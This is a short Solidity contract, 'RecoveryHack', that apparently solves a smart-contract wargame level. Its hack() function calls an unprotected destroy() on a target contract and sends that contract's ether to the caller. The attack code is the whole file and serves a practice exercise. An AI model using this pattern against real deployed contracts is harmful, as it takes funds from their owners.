// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRecovery {
    function destroy(address payable _to) external;
}

contract RecoveryHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        IRecovery(target).destroy(payable(msg.sender));
    }
}
